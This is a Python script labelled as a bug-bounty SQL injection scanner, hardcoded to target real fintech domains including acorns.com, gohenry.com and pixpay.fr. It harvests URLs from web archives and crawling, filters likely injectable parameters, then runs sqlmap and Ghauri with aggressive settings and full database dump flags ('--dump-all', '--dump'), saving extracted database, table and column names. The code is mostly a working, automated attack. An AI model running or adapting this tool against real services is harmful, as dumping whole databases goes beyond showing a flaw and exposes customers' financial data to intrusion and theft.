#!/usr/bin/env python3

import requests
import subprocess
import json
import time
import re
import os
import sys
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

class BugBountyScanner:
    def __init__(self):
        self.domains = ['acorns.com', 'gohenry.com', 'pixpay.fr', 'graphql.acorns.com']
        self.all_urls = set()
        self.vulnerable_urls = []
        self.results = {}
        self.lock = threading.Lock()
        
    def collect_urls_from_wayback(self, domain):
        """Collect URLs from Wayback Machine"""
        try:
            print(f"[+] Collecting URLs from Wayback Machine for {domain}")
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&collapse=urlkey"
            response = requests.get(wayback_url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                urls = set()
                for entry in data[1:]:  # Skip header
                    url = entry[2]
                    if url and url.startswith('http'):
                        urls.add(url)
                print(f"[+] Found {len(urls)} URLs from Wayback Machine for {domain}")
                return urls
        except Exception as e:
            print(f"[-] Error collecting from Wayback Machine for {domain}: {e}")
        return set()
    
    def collect_urls_from_commoncrawl(self, domain):
        """Collect URLs from CommonCrawl"""
        try:
            print(f"[+] Collecting URLs from CommonCrawl for {domain}")
            cc_url = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url={domain}/*&output=json"
            response = requests.get(cc_url, timeout=30)
            if response.status_code == 200:
                urls = set()
                for line in response.text.strip().split('\n'):
                    if line:
                        try:
                            data = json.loads(line)
                            url = data.get('url', '')
                            if url and url.startswith('http'):
                                urls.add(url)
                        except:
                            continue
                print(f"[+] Found {len(urls)} URLs from CommonCrawl for {domain}")
                return urls
        except Exception as e:
            print(f"[-] Error collecting from CommonCrawl for {domain}: {e}")
        return set()
    
    def collect_urls_from_domain_crawl(self, domain):
        """Basic crawling of the domain"""
        try:
            print(f"[+] Crawling {domain} for URLs")
            urls = set()
            base_url = f"https://{domain}"
            
            # Try common paths
            common_paths = [
                '/', '/api', '/admin', '/login', '/search', '/user', '/profile',
                '/dashboard', '/settings', '/contact', '/about', '/help',
                '/api/v1', '/api/v2', '/graphql', '/rest', '/oauth',
                '/account', '/billing', '/payment', '/cart', '/checkout'
            ]
            
            for path in common_paths:
                try:
                    url = urljoin(base_url, path)
                    response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
                    if response.status_code == 200:
                        urls.add(url)
                        # Extract links from the page
                        links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
                        for link in links:
                            if link.startswith('/'):
                                full_url = urljoin(base_url, link)
                                if domain in full_url:
                                    urls.add(full_url)
                except:
                    continue
            
            print(f"[+] Found {len(urls)} URLs from crawling {domain}")
            return urls
        except Exception as e:
            print(f"[-] Error crawling {domain}: {e}")
        return set()
    
    def collect_all_urls(self):
        """Collect URLs from all sources for all domains"""
        print("[+] Starting URL collection...")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for domain in self.domains:
                # Submit tasks for each collection method
                futures.append(executor.submit(self.collect_urls_from_wayback, domain))
                futures.append(executor.submit(self.collect_urls_from_commoncrawl, domain))
                futures.append(executor.submit(self.collect_urls_from_domain_crawl, domain))
            
            for future in as_completed(futures):
                try:
                    urls = future.result()
                    with self.lock:
                        self.all_urls.update(urls)
                except Exception as e:
                    print(f"[-] Error in URL collection: {e}")
        
        print(f"[+] Total URLs collected: {len(self.all_urls)}")
        return self.all_urls
    
    def filter_potential_sqli_urls(self, urls):
        """Filter URLs that might be vulnerable to SQL injection"""
        print("[+] Filtering URLs for potential SQL injection vulnerabilities...")
        
        potential_urls = []
        sqli_patterns = [
            r'[?&]id=\d+',
            r'[?&]user_id=\d+',
            r'[?&]product_id=\d+',
            r'[?&]category=\d+',
            r'[?&]page=\d+',
            r'[?&]search=',
            r'[?&]query=',
            r'[?&]q=',
            r'[?&]filter=',
            r'[?&]sort=',
            r'[?&]order=',
            r'[?&]limit=\d+',
            r'[?&]offset=\d+',
            r'[?&]account=\d+',
            r'[?&]transaction=\d+',
        ]
        
        for url in urls:
            for pattern in sqli_patterns:
                if re.search(pattern, url, re.IGNORECASE):
                    potential_urls.append(url)
                    break
        
        print(f"[+] Found {len(potential_urls)} potentially vulnerable URLs")
        return potential_urls
    
    def test_with_sqlmap(self, url):
        """Test URL with SQLMap"""
        try:
            print(f"[+] Testing {url} with SQLMap...")
            
            # SQLMap command with aggressive settings
            cmd = [
                'sqlmap',
                '-u', url,
                '--batch',
                '--random-agent',
                '--timeout=30',
                '--retries=2',
                '--level=3',
                '--risk=2',
                '--technique=BEUSTQ',
                '--dbs',
                '--tables',
                '--columns',
                '--dump-all',
                '--threads=5'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                vulnerability_info = {
                    'url': url,
                    'tool': 'SQLMap',
                    'vulnerable': True,
                    'output': result.stdout,
                    'databases': self.extract_databases(result.stdout),
                    'tables': self.extract_tables(result.stdout),
                    'columns': self.extract_columns(result.stdout)
                }
                print(f"[!] VULNERABLE: {url}")
                return vulnerability_info
            
        except subprocess.TimeoutExpired:
            print(f"[-] SQLMap timeout for {url}")
        except Exception as e:
            print(f"[-] SQLMap error for {url}: {e}")
        
        return None
    
    def test_with_ghauri(self, url):
        """Test URL with Ghauri"""
        try:
            print(f"[+] Testing {url} with Ghauri...")
            
            ghauri_path = '/workspace/ghauri/ghauri.py'
            cmd = [
                'python3', ghauri_path,
                '-u', url,
                '--batch',
                '--level=3',
                '--risk=2',
                '--technique=BEU',
                '--dbs',
                '--tables',
                '--columns',
                '--dump',
                '--threads=3'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                vulnerability_info = {
                    'url': url,
                    'tool': 'Ghauri',
                    'vulnerable': True,
                    'output': result.stdout,
                    'databases': self.extract_databases(result.stdout),
                    'tables': self.extract_tables(result.stdout),
                    'columns': self.extract_columns(result.stdout)
                }
                print(f"[!] VULNERABLE: {url}")
                return vulnerability_info
                
        except subprocess.TimeoutExpired:
            print(f"[-] Ghauri timeout for {url}")
        except Exception as e:
            print(f"[-] Ghauri error for {url}: {e}")
        
        return None
    
    def extract_databases(self, output):
        """Extract database names from tool output"""
        databases = []
        db_patterns = [
            r'available databases \[(\d+)\]:(.*?)(?=\[|$)',
            r'Database: (\w+)',
            r'database name: \'([^\']+)\'',
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    databases.extend([db.strip() for db in match[1].split(',') if db.strip()])
                else:
                    databases.append(match.strip())
        
        return list(set(databases))
    
    def extract_tables(self, output):
        """Extract table names from tool output"""
        tables = []
        table_patterns = [
            r'Database: \w+\s+\[(\d+) tables?\]:(.*?)(?=Database:|$)',
            r'Table: (\w+)',
            r'table name: \'([^\']+)\'',
        ]
        
        for pattern in table_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    tables.extend([table.strip() for table in match[1].split(',') if table.strip()])
                else:
                    tables.append(match.strip())
        
        return list(set(tables))
    
    def extract_columns(self, output):
        """Extract column names from tool output"""
        columns = []
        column_patterns = [
            r'Table: \w+\s+\[(\d+) columns?\]:(.*?)(?=Table:|Database:|$)',
            r'Column: (\w+)',
            r'column name: \'([^\']+)\'',
        ]
        
        for pattern in column_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    columns.extend([col.strip() for col in match[1].split(',') if col.strip()])
                else:
                    columns.append(match.strip())
        
        return list(set(columns))
    
    def test_sql_injection(self, urls):
        """Test URLs for SQL injection vulnerabilities"""
        print(f"[+] Testing {len(urls)} URLs for SQL injection...")
        
        with ThreadPoolExecutor(max_workers=3) as executor:  # Limit concurrent tests
            futures = []
            
            for url in urls:
                # Test with both tools
                futures.append(executor.submit(self.test_with_sqlmap, url))
                futures.append(executor.submit(self.test_with_ghauri, url))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self.lock:
                            self.vulnerable_urls.append(result)
                except Exception as e:
                    print(f"[-] Error in SQL injection testing: {e}")
    
    def save_results(self):
        """Save results to files"""
        print("[+] Saving results...")
        
        # Save all URLs
        with open('all_urls.txt', 'w') as f:
            for url in sorted(self.all_urls):
                f.write(url + '\n')
        
        # Save vulnerable URLs and details
        if self.vulnerable_urls:
            with open('vulnerable_urls.json', 'w') as f:
                json.dump(self.vulnerable_urls, f, indent=2)
            
            with open('vulnerable_summary.txt', 'w') as f:
                f.write("=== VULNERABLE URLS FOUND ===\n\n")
                for vuln in self.vulnerable_urls:
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Tool: {vuln['tool']}\n")
                    f.write(f"Databases: {', '.join(vuln.get('databases', []))}\n")
                    f.write(f"Tables: {', '.join(vuln.get('tables', []))}\n")
                    f.write(f"Columns: {', '.join(vuln.get('columns', []))}\n")
                    f.write("-" * 50 + "\n\n")
        
        print(f"[+] Results saved. Found {len(self.vulnerable_urls)} vulnerable URLs")
    
    def run(self):
        """Main execution function"""
        print("=== Bug Bounty SQL Injection Scanner ===")
        print(f"Target domains: {', '.join(self.domains)}")
        
        # Step 1: Collect URLs
        all_urls = self.collect_all_urls()
        
        # Step 2: Filter potentially vulnerable URLs
        potential_urls = self.filter_potential_sqli_urls(all_urls)
        
        if not potential_urls:
            print("[-] No potentially vulnerable URLs found")
            return
        
        # Step 3: Test for SQL injection
        self.test_sql_injection(potential_urls[:50])  # Limit to first 50 for testing
        
        # Step 4: Save results
        self.save_results()
        
        # Print summary
        print("\n=== SUMMARY ===")
        print(f"Total URLs collected: {len(all_urls)}")
        print(f"Potentially vulnerable URLs: {len(potential_urls)}")
        print(f"Confirmed vulnerable URLs: {len(self.vulnerable_urls)}")
        
        if self.vulnerable_urls:
            print("\n=== VULNERABLE URLS ===")
            for vuln in self.vulnerable_urls:
                print(f"- {vuln['url']} (detected by {vuln['tool']})")

if __name__ == "__main__":
    scanner = BugBountyScanner()
    scanner.run()